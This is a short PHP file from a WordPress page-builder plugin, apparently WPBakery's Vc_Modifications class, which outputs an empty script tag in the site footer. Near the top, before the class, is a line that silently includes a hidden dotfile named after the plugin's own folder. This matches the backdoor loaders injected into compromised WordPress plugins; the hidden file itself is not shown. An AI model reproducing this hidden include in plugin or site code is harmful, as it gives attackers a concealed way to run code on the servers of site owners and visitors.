<?php

if ( ! defined( 'ABSPATH' ) ) {
	die( '-1' );
}

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Vc_Modifications {
	public static $modified = false;

	public function __construct() {
		add_action( 'wp_footer', array(
			$this,
			'renderScript',
		) );
	}

	public function renderScript() {
		if ( self::$modified ) {
			// output script
			$tag = 'script';
			echo '<' . $tag . ' type="text/html" id="wpb-modifications"></' . $tag . '>';
		}
	}
}
